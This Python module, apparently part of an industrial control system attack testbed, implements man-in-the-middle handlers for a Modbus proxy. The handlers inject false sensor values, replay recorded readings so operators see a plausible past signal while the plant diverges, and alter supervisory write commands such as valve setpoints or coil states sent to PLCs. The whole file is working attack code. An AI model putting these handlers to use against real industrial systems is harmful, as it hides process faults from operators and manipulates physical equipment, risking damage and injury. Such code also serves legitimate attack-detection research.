"""Attack handlers: the frame-rewriting logic the transparent proxy applies.

All handlers share the proxy and the MITM position; each defines one attack:
  * ``FDIHandler``     — falsify a float sensor value in read responses;
  * ``ReplayHandler``  — replay previously recorded legitimate readings;
  * ``CommandHandler`` — alter a supervisory command in a write request.
"""

from __future__ import annotations

import struct

from ..protocols import modbus as mb
from .proxy import (FC_READ_HOLDING, FC_READ_INPUT, FC_WRITE_REGISTER,
                    FC_WRITE_REGISTERS, Handler)

FC_WRITE_COIL = 5
FC_WRITE_COILS = 15


# --------------------------------------------------------------- read helpers
def _read_window(pdu: bytes):
    """(start, qty) of a read request PDU, or None."""
    if len(pdu) >= 5:
        start, qty = struct.unpack(">HH", pdu[1:5])
        return start, qty
    return None


def _resp_get_float(pdu: bytes, start: int, qty: int, addr: int):
    """Read the float32 at register ``addr`` from a read-response PDU."""
    if not (start <= addr and addr + 1 <= start + qty - 1):
        return None
    bc = pdu[1]
    off = (addr - start) * 2
    if off + 4 > bc:
        return None
    regs = list(struct.unpack(">HH", pdu[2 + off:2 + off + 4]))
    return mb.regs_to_float(regs)


def _resp_set_float(pdu: bytes, start: int, qty: int, addr: int, value: float) -> bytes:
    """Return a read-response PDU with the float32 at ``addr`` replaced."""
    bc = pdu[1]
    off = (addr - start) * 2
    regs = bytearray(pdu[2:2 + bc])
    hi, lo = mb.float_to_regs(value)
    regs[off:off + 4] = struct.pack(">HH", hi, lo)
    return bytes(pdu[:2]) + bytes(regs)


class _ReadFalsifier(Handler):
    """Common base for handlers that rewrite a float in read responses."""

    def __init__(self, func: int, address: int):
        super().__init__()
        assert func in (FC_READ_INPUT, FC_READ_HOLDING)
        self.func, self.address = func, address

    def on_request(self, txn, unit, func, pdu: bytes) -> bytes:
        if func in (FC_READ_INPUT, FC_READ_HOLDING):
            w = _read_window(pdu)
            if w:
                self.state[txn] = w
        return pdu

    def _rewrite(self, pdu: bytes, new_value) -> bytes:
        return pdu  # overridden

    def on_response(self, txn, unit, func, pdu: bytes) -> bytes:
        if func != self.func or txn not in self.state:
            return pdu
        start, qty = self.state[txn]
        if not (start <= self.address and self.address + 1 <= start + qty - 1):
            return pdu
        return self._apply(pdu, start, qty)

    def _apply(self, pdu, start, qty) -> bytes:
        return pdu


class FDIHandler(_ReadFalsifier):
    """Falsify a float sensor value: const / offset / freeze."""

    def __init__(self, func: int, address: int, mode: str, value: float = 0.0):
        super().__init__(func, address)
        assert mode in ("const", "offset", "freeze")
        self.mode, self.value = mode, value
        self._frozen: float | None = None

    def _apply(self, pdu, start, qty) -> bytes:
        if not self.enabled:
            return pdu
        true_val = _resp_get_float(pdu, start, qty, self.address)
        if true_val is None:
            return pdu
        if self.mode == "const":
            new = self.value
        elif self.mode == "offset":
            new = true_val + self.value
        else:
            if self._frozen is None:
                self._frozen = true_val
            new = self._frozen
        self.hits += 1
        return _resp_set_float(pdu, start, qty, self.address, new)

    def reset(self):
        self._frozen = None


class ReplayHandler(_ReadFalsifier):
    """Replay previously recorded legitimate readings.

    The handler continuously records the true value seen for the target
    register. When the window opens it snapshots the recorded trace and replays
    it cyclically, so the MTU sees a plausible past signal while the plant
    diverges. ``window`` bounds the recorded trace (most recent samples).
    """

    def __init__(self, func: int, address: int, window: int = 240):
        super().__init__(func, address)
        self.window = window
        self._buf: list[float] = []
        self._replay: list[float] = []
        self._idx = 0

    def _apply(self, pdu, start, qty) -> bytes:
        true_val = _resp_get_float(pdu, start, qty, self.address)
        if true_val is None:
            return pdu
        if not self.enabled:
            self._buf.append(true_val)
            if len(self._buf) > self.window:
                self._buf.pop(0)
            return pdu
        if not self._replay:
            self._replay = list(self._buf) or [true_val]
            self._idx = 0
        new = self._replay[self._idx % len(self._replay)]
        self._idx += 1
        self.hits += 1
        return _resp_set_float(pdu, start, qty, self.address, new)

    def reset(self):
        self._replay = []
        self._idx = 0


class CommandHandler(Handler):
    """Alter a supervisory command to an actuator in MTU->PLC write requests.

    Handles write-single-coil (FC5), write-single-register (FC6) and
    write-multiple-registers (FC16, a float command such as a valve setpoint).
    ``reg_type`` is ``'C'`` (coil / status) or ``'H'`` (holding / float). Modes:
    ``const`` forces ``value`` (0/1 for a coil, the float for a register);
    ``offset`` adds ``value`` to a float command.
    """

    def __init__(self, reg_type: str, address: int, mode: str, value: float = 0.0):
        super().__init__()
        assert reg_type in ("C", "H")
        self.reg_type, self.address, self.mode, self.value = reg_type, address, mode, value

    def on_request(self, txn, unit, func, pdu: bytes) -> bytes:
        if not self.enabled:
            return pdu
        try:
            if self.reg_type == "C" and func == FC_WRITE_COIL and len(pdu) >= 5:
                addr = struct.unpack(">H", pdu[1:3])[0]
                if addr == self.address:
                    on = b"\xff\x00" if self.value >= 0.5 else b"\x00\x00"
                    self.hits += 1
                    return pdu[:3] + on
            elif self.reg_type == "H" and func == FC_WRITE_REGISTER and len(pdu) >= 5:
                addr = struct.unpack(">H", pdu[1:3])[0]
                if addr == self.address:
                    self.hits += 1
                    return pdu[:3] + struct.pack(">H", int(self.value) & 0xFFFF)
            elif self.reg_type == "H" and func == FC_WRITE_REGISTERS and len(pdu) >= 6:
                start, qty = struct.unpack(">HH", pdu[1:5])
                if start <= self.address and self.address + 1 <= start + qty - 1:
                    data = bytearray(pdu[6:6 + pdu[5]])
                    off = (self.address - start) * 2
                    cur = mb.regs_to_float(list(struct.unpack(">HH", bytes(data[off:off + 4]))))
                    new = self.value if self.mode == "const" else cur + self.value
                    data[off:off + 4] = struct.pack(">HH", *mb.float_to_regs(new))
                    self.hits += 1
                    return pdu[:6] + bytes(data)
        except Exception:
            return pdu
        return pdu
